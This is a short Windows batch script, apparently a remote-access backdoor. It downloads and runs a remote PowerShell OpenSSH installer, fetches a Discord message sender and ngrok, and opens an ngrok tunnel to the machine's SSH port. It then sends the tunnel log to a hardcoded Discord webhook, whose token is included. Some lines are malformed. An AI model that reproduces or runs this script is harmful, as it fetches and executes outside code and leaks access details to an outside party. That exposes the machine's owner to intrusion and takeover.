C:
cd %temp%

curl https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/OpenSSH.ps1 -o OpenSSH.ps1
curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat -o source.bat
curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip

powershell ./OpenSSH.ps1

tar -xf ngrok.zip
set "webhook=https://discord.com/api/webhooks/893838978833350706/S6T93mD5c6dA6kMHIgWWzHPiFJH3rj2XqANwwvPn2nHmkJhEd6PPYJeNvO3qKCKG6xtK"
start timeout5 & Source.bat -silent --file %temp%/ngrok.log & exit \b
ngrok tcp 22 -log=stdout > ngrok.log &
